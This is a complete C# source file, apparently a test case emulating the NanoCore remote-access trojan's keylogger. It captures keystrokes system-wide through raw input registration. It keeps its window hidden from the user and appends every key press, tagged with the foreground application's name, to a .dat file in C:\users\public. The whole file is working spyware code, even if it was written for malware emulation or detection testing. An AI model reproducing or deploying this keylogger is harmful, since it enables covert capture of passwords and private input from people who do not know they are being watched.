//Author: Shaddy43

ï»¿using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace NanoCore_testcase14
{
    public class RawInputForm : Form
    {
        private static string logger_path = "C:\\users\\public\\";
        private const int WM_INPUT = 0x00FF;
        private const int INPUT_KEYBOARD = 1;
        private const int RID_INPUT = 0x10000003;
        private const int RIDEV_INPUTSINK = 0x00000100;
        private string currentFocusedApp;

        [StructLayout(LayoutKind.Sequential)]
        public struct RAWINPUTHEADER
        {
            public uint dwType;
            public uint dwSize;
            public IntPtr hDevice;
            public IntPtr wParam;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RAWKEYBOARD
        {
            public ushort MakeCode;
            public ushort Flags;
            public ushort Reserved;
            public ushort VKey;
            public uint Message;
            public uint ExtraInformation;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct RAWINPUT
        {
            [FieldOffset(0)]
            public RAWINPUTHEADER header;
            [FieldOffset(16)]
            public RAWKEYBOARD keyboard;
        }

        [DllImport("User32.dll")]
        public static extern bool RegisterRawInputDevices(RAWINPUTDEVICE[] pRawInputDevice, uint uiNumDevices, uint cbSize);

        [DllImport("User32.dll")]
        public static extern int GetRawInputData(IntPtr hRawInput, uint uiCommand, IntPtr pData, ref uint pcbSize, uint cbSizeHeader);


        [StructLayout(LayoutKind.Sequential)]
        public struct RAWINPUTDEVICE
        {
            public ushort usUsagePage;
            public ushort usUsage;
            public uint dwFlags;
            public IntPtr hwndTarget;
        }

        public RawInputForm()
        {
            Console.WriteLine("[x] Starting the logger..."); 
            setup(this.Handle);

            Console.WriteLine("[x] Hiding logger...");
            //this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.VisibleChanged += RawInputForm_VisibleChanged;
        }

        private void RawInputForm_VisibleChanged(object sender, EventArgs e)
        {
            this.Visible = false;
            Console.WriteLine("Logger Hidden!!!");
        }

        public static bool RegisterDevices(IntPtr handle)
        {
            Console.WriteLine("Registering RAW input device for logging...");

            // Register for keyboard input
            RAWINPUTDEVICE rid = new RAWINPUTDEVICE();
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = handle;

            if (!RegisterRawInputDevices(new[] { rid }, 1, (uint)Marshal.SizeOf(typeof(RAWINPUTDEVICE))))
            {
                //MessageBox.Show("Failed to register raw input device(s).");
                return false;
            }
            return true;
        }

        private static void setup(IntPtr handle)
        {
            logger_path = Path.Combine(logger_path, Path.ChangeExtension("KB_" + Conversions.ToString(Environment.TickCount), "dat"));
            Console.WriteLine("Setting logger path: " + logger_path);

            if (!RegisterDevices(handle))
            {
                Console.WriteLine("RAW input device registration failed!");
                Environment.Exit(1);
            }
            Console.WriteLine("RAW input device successfully registered!!!");
        }

        // Override SetVisibleCore
        protected override void SetVisibleCore(bool value)
        {
            if (!IsHandleCreated)
            {
                CreateHandle();
                value = false;  // Prevent the form from being shown
            }
            base.SetVisibleCore(value);
        }

        // The process that recieves all RAW inputs WndProc overridden to handle the raw inputs and log them
        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case WM_INPUT:
                    HandleRawInput(m.LParam);
                    break;
            }

            base.WndProc(ref m);
        }

        private void HandleRawInput(IntPtr hRawInput)
        {
            Console.Write("[x] Getting RAW input data...");

            RAWINPUT input = new RAWINPUT();
            uint size = (uint)Marshal.SizeOf(typeof(RAWINPUT));

            if (GetRawInputData(hRawInput, RID_INPUT, IntPtr.Zero, ref size, (uint)Marshal.SizeOf(typeof(RAWINPUTHEADER))) != -1)
            {
                IntPtr buffer = Marshal.AllocHGlobal((int)size);
                if (GetRawInputData(hRawInput, RID_INPUT, buffer, ref size, (uint)Marshal.SizeOf(typeof(RAWINPUTHEADER))) == size)
                {
                    input = (RAWINPUT)Marshal.PtrToStructure(buffer, typeof(RAWINPUT));
                    if (input.header.dwType == INPUT_KEYBOARD && (input.keyboard.Flags & 1) == 0) // Only when a key is pressed down
                    {
                        LogKey(input.keyboard.VKey);
                    }
                }
                Marshal.FreeHGlobal(buffer);
            }
        }

        private void LogKey(ushort vkey)
        {
            string newFocusedApp = FocusChecker.GetFocusedApplication();
            if (newFocusedApp != currentFocusedApp)
            {
                currentFocusedApp = newFocusedApp;
                File.AppendAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, logger_path),
                                   $"\nFocus changed to application: {currentFocusedApp} at {DateTime.Now}\nKey Pressed: ");

                Console.WriteLine("Checking application focus: " + currentFocusedApp);
            }

            string mappedCharacter = MapKeys.GetKeyDescription(vkey);
            string logEntry;

            if (mappedCharacter != null)
            {
                logEntry = $"{mappedCharacter}";
                Console.WriteLine("Mapped Input: " + logEntry);
            }
            else
            {
                logEntry = $"[unknown key: {vkey} ]";
            }
            File.AppendAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, logger_path), logEntry);
        }

        [STAThread]
        public static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new RawInputForm());
        }
    }

    public static class FocusChecker
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        public static string GetFocusedApplication()
        {
            IntPtr hWnd = GetForegroundWindow();
            int processId;
            GetWindowThreadProcessId(hWnd, out processId);

            Process proc = Process.GetProcessById(processId);
            return proc.ProcessName;
        }
    }

    public class MapKeys
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        public static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardLayout(uint idThread);

        public static string GetKeyDescription(ushort key)
        {
            // First check for special key descriptions.
            string specialKeyDescription = GetSpecialKeyDescription(key);
            if (!string.IsNullOrEmpty(specialKeyDescription))
            {
                return specialKeyDescription;
            }

            byte[] keyboardState = new byte[256];
            StringBuilder buffer = new StringBuilder(2);
            uint virtualKeyCode = key;
            uint scanCode = MapVirtualKeyEx(virtualKeyCode, 0, GetKeyboardLayout(0));
            int result = ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, buffer, 2, 0, GetKeyboardLayout(0));

            if (result == 1 || result == 2)
            {
                return buffer[0].ToString();
            }
            else
            {
                return null;
            }
        }

        private static string GetSpecialKeyDescription(ushort vkey)
        {
            switch (vkey)
            {
                case 0x08: return "{Backspace}";
                case 0x09: return "{Tab}";
                case 0x0C: return "{Clear}";
                case 0x0D: return "{Enter}";
                case 0x10: return "{Shift}";
                case 0x11: return "{Ctrl}";
                case 0x12: return "{Alt}";
                case 0x13: return "{Pause}";
                case 0x14: return "{Caps Lock}";
                case 0x1B: return "{Escape}";
                case 0x20: return "{Space}";
                case 0x21: return "{Page Up}";
                case 0x22: return "{Page Down}";
                case 0x23: return "{End}";
                case 0x24: return "{Home}";
                case 0x25: return "{Left Arrow}";
                case 0x26: return "{Up Arrow}";
                case 0x27: return "{Right Arrow}";
                case 0x28: return "{Down Arrow}";
                case 0x2D: return "{Insert}";
                case 0x2E: return "{Delete|";
                case 0x2F: return "{Help}";
                case 0x30: return "0";
                case 0x31: return "1";
                case 0x32: return "2";
                case 0x33: return "3";
                case 0x34: return "4";
                case 0x35: return "5";
                case 0x36: return "6";
                case 0x37: return "7";
                case 0x38: return "8";
                case 0x39: return "9";
                case 0x5B: return "{Left Windows}";
                case 0x5C: return "{Right Windows}";
                case 0x5D: return "{Select}";
                case 0x5F: return "{Sleep}";
                case 0x60: return "{Numeric 0}";
                case 0x61: return "{Numeric 1}";
                case 0x62: return "{Numeric 2}";
                case 0x63: return "{Numeric 3}";
                case 0x64: return "{Numeric 4}";
                case 0x65: return "{Numeric 5}";
                case 0x66: return "{Numeric 6}";
                case 0x67: return "{Numeric 7}";
                case 0x68: return "{Numeric 8}";
                case 0x69: return "{Numeric 9}";
                case 0x6A: return "{Multiply}";
                case 0x6B: return "{Add}";
                case 0x6C: return "{Separator}";
                case 0x6D: return "{Subtract}";
                case 0x6E: return "{Decimal}";
                case 0x6F: return "{Divide}";
                case 0x70: return "{F1}";
                case 0x71: return "{F2}";
                case 0x72: return "{F3}";
                case 0x73: return "{F4}";
                case 0x74: return "{F5}";
                case 0x75: return "{F6}";
                case 0x76: return "{F7}";
                case 0x77: return "{F8}";
                case 0x78: return "{F9}";
                case 0x79: return "{F10}";
                case 0x7A: return "{F11}";
                case 0x7B: return "{F12}";
                case 0x7C: return "{F13}";
                case 0x7D: return "{F14}";
                case 0x7E: return "{F15}";
                case 0x7F: return "{F16}";
                case 0x90: return "{Num Lock}";
                case 0x91: return "{Scroll Lock}";
                case 0xA0: return "{Left Shift}";
                case 0xA1: return "{Right Shift}";
                case 0xA2: return "{Left Ctrl}";
                case 0xA3: return "{Right Ctrl}";
                case 0xA4: return "{Left Alt}";
                case 0xA5: return "{Right Alt}";
                case 0xAD: return "{Volume Mute}";
                case 0xAE: return "{Volume Down}";
                case 0xAF: return "{Volume Up}";
                case 0xB0: return "{Next Track}";
                case 0xB1: return "{Prev Track}";
                case 0xB2: return "{Stop}";
                case 0xB3: return "{Play/Pause}";
                case 0xB4: return "{Mail}";
                case 0xB5: return "{Select Media}";
                case 0xB6: return "{Application1}";
                case 0xB7: return "{Application2}";
                default: return null;
            }
        }
    }
}
